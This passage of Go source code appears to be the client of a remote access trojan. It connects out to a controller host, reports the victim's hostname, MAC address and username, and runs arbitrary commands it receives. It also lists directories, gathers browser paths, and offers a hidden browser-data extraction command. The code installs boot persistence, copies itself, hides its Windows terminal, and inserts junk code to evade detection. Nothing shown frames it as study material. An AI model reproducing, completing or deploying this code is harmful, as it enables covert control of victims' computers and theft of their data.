		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == browserpathsStr {
		result := getRecentPaths()
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == setpersistenceStr {
		exePath, _ := os.Executable()
		setPersistence(exePath)
		response := Resp{Type: "response", Content: "Persistence set successfully - Client will start on system boot"}
		sendData(conn, response)
	} else if command == removepersistenceStr {
		removePersistence()
		response := Resp{Type: "response", Content: "Persistence removed successfully - Client will not start on system boot"}
		sendData(conn, response)
	} else if command == checkpersistenceStr {
		exePath, _ := os.Executable()
		var response Resp
		if isPersistenceSet(exePath) {
			response = Resp{Type: "response", Content: "Persistence is ACTIVE - Client will start on system boot"}
		} else {
			response = Resp{Type: "response", Content: "Persistence is NOT SET - Client will not start on system boot"}
		}
		sendData(conn, response)
	} else if command == lsStr || command == dirStr {
		result := listDir("")
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if strings.HasPrefix(command, lsStr) && len(command) > len(lsStr) {
		path := cleanCommandPathArg(command[len(lsStr):])
		result := listDir(path)
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if strings.HasPrefix(command, dirStr+" ") && len(command) > len(dirStr)+1 {
		path := cleanCommandPathArg(strings.TrimPrefix(command, dirStr+" "))
		result := listDir(path)
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == pwdStr {
		result := getCurrentDir()
		response := Resp{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == cdStr+".." {
		result := changeDir("..")
		response := Resp{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	} else if strings.HasPrefix(command, cdStr) {
		path := cleanCommandPathArg(strings.TrimPrefix(command, cdStr))
		result := changeDir(path)
		response := Resp{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	} else {
		result := runCommand(command)
		response := Resp{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	}
	// Junk after handle
	_ = hashString(command)
}

func handleShell(conn net.Conn) {
	initialMessage := map[string]interface{}{
		"hostname":   getHostname(),
		"macAddress": getMACAddress(),
		"username":   getUsername(),
		"sessionId":  makeSessionID(),
	}
	err := sendData(conn, initialMessage)
	if err != nil {
		return
	}
	// Send connection confirmation message
	response := Resp{Type: "response", Content: fmt.Sprintf("Client connected successfully!\nHostname: %s\nUser: %s\nSession: %s\n\nReady for commands. Use 'extractbrowserhidden' to extract browser data when needed.", getHostname(), getUsername(), makeSessionID())}
	sendData(conn, response)

	for {
		command, err := recvData(conn)
		if err != nil {
			return
		}
		var cmd Cmd
		err = json.Unmarshal([]byte(command), &cmd)
		if err != nil {
			cmd = Cmd{Type: "command", Content: strings.TrimSpace(command)}
		}
		switch cmd.Type {
		case "heartbeat":
			continue
		case "command":
			obfuscatedHandleCmd(strings.TrimSpace(cmd.Content), conn) // Use flattened wrapper
		}
	}
}

func main() {
	go addJunkData()
	junkHeavy()

	if runtime.GOOS == "windows" {
		hideTerminal()
		// Drop legacy HKCU Run entry so logon does not start a second instance with Startup .bat
		removeRegistryAutoStart()
	}

	if !ensureSingleInstance() {
		os.Exit(0)
	}

	exePath, _ := os.Executable()
	exePath = normalizeExePath(exePath)

	if isAppMode() {
		if runtime.GOOS == "windows" {
			time.Sleep(100 * time.Millisecond)
		}
		fmt.Println(exePath)
		go func() {
			time.Sleep(5 * time.Second)
			setPersistence(exePath)
		}()
	} else {
		go func() {
			copyPath := makeCopy()
			fmt.Println(copyPath)
			if copyPath != "" && !isPersistenceSet(copyPath) {
				time.Sleep(10 * time.Second)
				setPersistence(copyPath)
			}
		}()
	}

	initAppMode()

	serverPort := getPort()
	setupSignals()

	const reconnectDelay = 10 * time.Second

	for {
		serverHost := getHost()
		dialer := &net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}
		conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", serverHost, serverPort))
		if err != nil {
			time.Sleep(reconnectDelay)
			continue
		}

		conn.SetDeadline(time.Time{})
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetKeepAlive(true)
			tcpConn.SetKeepAlivePeriod(30 * time.Second)
			tcpConn.SetLinger(0)
		}

		handleShell(conn)
		conn.Close()

		// Server restart, network drop, or kill: wait then dial again while process is alive
		time.Sleep(reconnectDelay)
		// Junk in loop
		_ = hashString("loop_junk")
		// Extra junk
		for i := 0; i < 5; i++ {
			_ = i % 13
		}
		junk := 0
		for k := 0; k < 20; k++ {
			junk += k * (k % 5)
		}
		_ = junk
	}
}